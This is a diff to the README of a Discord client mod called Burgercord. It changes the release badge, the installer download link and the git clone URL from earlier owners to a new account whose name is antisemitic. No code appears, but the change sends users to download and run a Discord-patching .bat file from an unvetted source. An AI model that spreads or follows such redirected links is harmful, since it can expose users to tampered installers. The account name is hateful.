@@ -1,6 +1,6 @@
 # 🍔 Burgercord
 
-[![GitHub Release](https://img.shields.io/github/v/release/handleSendMessage/burgercord?style=for-the-badge&color=F09C1F&label=Release)](https://github.com/handleSendMessage/burgercord/releases)
+[![GitHub Release](https://img.shields.io/github/v/release/AbusiveJew/burgercord?style=for-the-badge&color=F09C1F&label=Release)](https://github.com/AbusiveJew/burgercord/releases)
 [![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg?style=for-the-badge)](LICENSE)
 
 A high-performance, token-hardened Discord client modification with low-latency call optimization, local session vault defense, custom burger branding, and automatic boot updates.
@@ -36,14 +36,14 @@ Unlike standard client mods, **Burgercord** comes with built-in performance and 
 ## 📥 Installation
 
 ### Method 1: One-Click Installer (Windows)
-1. Download `BurgercordInstaller.bat` from the [Latest Release](https://github.com/mrvonderplanitz/burgercord/releases/latest).
+1. Download `BurgercordInstaller.bat` from the [Latest Release](https://github.com/AbusiveJew/burgercord/releases/latest).
 2. Run `BurgercordInstaller.bat`.
 3. If Discord is running, the installer will safely close it, patch it with Burgercord, and relaunch it automatically!
 
 ### Method 2: From Source
 ```bash
 # Clone the repository
-git clone https://github.com/handleSendMessage/burgercord.git
+git clone https://github.com/AbusiveJew/burgercord.git
 cd burgercord
 
 # Install dependencies (Node 20+ and pnpm required)
